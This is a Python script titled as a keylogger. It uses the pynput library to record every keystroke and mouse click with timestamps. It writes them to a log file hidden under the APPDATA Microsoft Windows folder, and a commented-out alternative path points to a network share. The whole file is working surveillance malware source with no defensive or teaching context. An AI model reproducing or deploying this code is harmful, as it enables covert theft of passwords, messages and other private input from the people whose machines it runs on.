# KEYLOGGER

import pynput.keyboard
import pynput.mouse
from datetime import datetime
import os

keys = []

log_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "log.txt")
# Objects in PYNPUT to compare and clean logging
specials = [
    pynput.keyboard.Key.backspace, pynput.keyboard.Key.enter, pynput.keyboard.Key.space, pynput.keyboard.Key.tab,
    pynput.keyboard.Key.shift, pynput.keyboard.Key.shift_r, pynput.keyboard.Key.ctrl, pynput.keyboard.Key.ctrl_l,
    pynput.keyboard.Key.alt, pynput.keyboard.Key.alt_l, pynput.keyboard.Key.cmd, pynput.keyboard.Key.caps_lock, pynput.keyboard.Key.scroll_lock,
    pynput.keyboard.Key.num_lock, pynput.keyboard.Key.delete,
    pynput.keyboard.Key.pause, pynput.keyboard.Key.up, pynput.keyboard.Key.down, pynput.keyboard.Key.left,
    pynput.keyboard.Key.right,
    pynput.keyboard.Key.f1, pynput.keyboard.Key.f2, pynput.keyboard.Key.f3, pynput.keyboard.Key.f4,
    pynput.keyboard.Key.f5, pynput.keyboard.Key.f6, pynput.keyboard.Key.f7, pynput.keyboard.Key.f8,
    pynput.keyboard.Key.f9, pynput.keyboard.Key.f10, pynput.keyboard.Key.f11, pynput.keyboard.Key.f12
]


# Custom Functions to write dates
def on_tab(key):
    try:
        value = ',{0}\n'.format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")[:-3])
        keys.append(value)
        write_file(keys)
    except Exception as e:
        print(f"Error: {e}")


def on_punctuation(key):
    try:
        value = ',{0}\n'.format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")[:-3])
        keys.append(value)
        write_file(keys)
    except Exception as e:
        print(f"Error: {e}")


def on_enter(key):
    try:
        value = ',{0}\n'.format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")[:-3])
        keys.append(value)
        write_file(keys)
    except Exception as e:
        print(f"Error: {e}")


# Pre-Defined Function parameters for PYNPUT with custom code

def on_click(x, y, something, pressed):
    if pressed:
        value = ',{0}\n'.format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")[:-3])
        keys.append(value)
        write_file(keys)  # Write to file


def on_press(key):
    if isinstance(key, str):
        key = key.strip()

    if hasattr(key, 'char') and key.char == ',':
        keys.append("")
    else:
        keys.append(key)

    write_file(keys)
    # Check if tab selected and print date
    if key == pynput.keyboard.Key.tab:
        on_tab(key)

    # Check if enter selected and print date
    elif key == pynput.keyboard.Key.enter:
        on_enter(key)
    # Check if punctuation selected and print date
    elif hasattr(key, 'char') and key.char == '.' or hasattr(key, 'char') and key.char == '!' or hasattr(key,'char') and key.char == '?' or hasattr(key, 'char') and key.char == ',':
        on_punctuation(key)
    else:
        pass


# Write to log flie
def write_file(keys):
    # Append text to file
    with open(log_path, 'a') as f:
        for key in keys:
            if key in specials:
                key = " "
                # removing ''
                k = str(key).replace("'", "")
                f.write(k)

                # explicitly adding a space after
                # every keystroke for readability
                # f.write(' ')
            else:
                # removing ''
                k = str(key).replace("'", "")
                f.write(k)
            # Clear List after writing
        keys.clear()


    # Create separate listeners


mouse_listener = pynput.mouse.Listener(on_click=on_click)
keyboard_listener = pynput.keyboard.Listener(on_press=on_press)

# Start both listeners
mouse_listener.start()
keyboard_listener.start()

# Keep the main thread running
mouse_listener.join()
keyboard_listener.join()



#e
#log_path = r"\\192.168.1.100\SharedFolder\log.txt"
#C:\Users\ckeme\AppData\Roaming\Microsoft\Windows


